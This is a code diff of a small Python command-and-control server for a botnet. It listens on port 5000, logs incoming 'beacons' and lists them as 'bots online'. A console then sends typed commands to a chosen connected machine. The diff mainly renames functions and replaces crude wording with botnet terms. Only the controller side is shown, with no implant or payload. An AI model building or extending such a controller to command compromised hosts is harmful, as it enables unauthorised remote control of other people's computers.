@@ -1,16 +1,10 @@
 import socket
 import threading
-from os import system
+import sys
 
-lis={} #collect connection
-ips=[]
-count=0
-def babies(conn,addr):
-    print("[+] Sir you successfully  connected to {}".format(addr))
-    conn.sendall(b"suckers")
-
-def start():
-
+conn_list={}
+def server():
+    global conn_list
     HOST = ''                 # Symbolic name meaning all available interfaces
     PORT = 5000            # Arbitrary non-privileged port
     global count
@@ -21,53 +15,61 @@ def start():
     while True:
         conn, addr = s.accept()
         if conn:
-            count+=1
-            lis[addr]=conn
-            ips.append(addr)
-            print('Connected by', addr)
+            conn_list[addr]=conn
+            print('Beacon Recieved {}:{}\n>'.format(addr[0],addr[1]))
 
 
 def client():
-    a=1
-    if ips:
-        for i in ips:
-            print ("{} --> {}".format(a,i))
-            a+=1
+    global conn_list
+    count = 0
+    if conn_list:
+        for key in conn_list:
+            count+=1
+            print("{}) {}:{}".format(count,key[0],key[1]))
+
     else:
-        print("NO CONNECTION SIRE")
+        print("List is empty")
 
-def action():
-    e=int(input("Whom you wanna interact with:-"))
-    e-=1
-    ass=ips[e]
 
-    if ass in lis:
-        if lis[ass].recv(1024):
-            babies(lis[ass],ass)
+
+def trigger():
+    global conn_list
+    interaction=int(input("Whom you wanna interact with:-"))
+    if interaction:
+        if conn_list:
+            console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1][0],list(conn_list.keys())[interaction-1][1])
         else:
-            print("Connection Dead !!")
-            del lis[ass]
-            ips.remove(ass)
+            print("No connections")
 
+def console(conn,ip,port):
+    print("\n====Target::({}:{})====".format(ip,port))
+    while True:
+        commands=input("cmd>")
+        if commands=='exit':
+            return 0
+        else:
+            commands = bytes(commands, 'utf-8')
+            conn.sendall(commands)
 
+def banner():
+    print("[+] Ignite the light master and change this filthy reality...")
 
 def main():
-    system('clear')
-    print ("=== Welcome to the server ===")
-    threading.Thread(target=start).start()
-    print ("[+] Listner Started")
+    banner()
+    threading.Thread(target=server).start()
+    print("[+] Server Started")
     while True:
-        print ("\nPress 1 to view the current asses online\npress 2 to select to interact")
-        e=input(">")
-        if e=='1':
+        choice=input("\nPress 1 to view the current bots online\npress 2 to select to interact\n>")
+        if choice=='1':
             p=threading.Thread(target=client)
             p.start()
             p.join()
-
-        elif e=='2':
-            p=threading.Thread(target=action)
+        elif choice =='2':
+            p=threading.Thread(target=trigger)
             p.start()
             p.join()
+        else:
+            pass
 
 
 main()
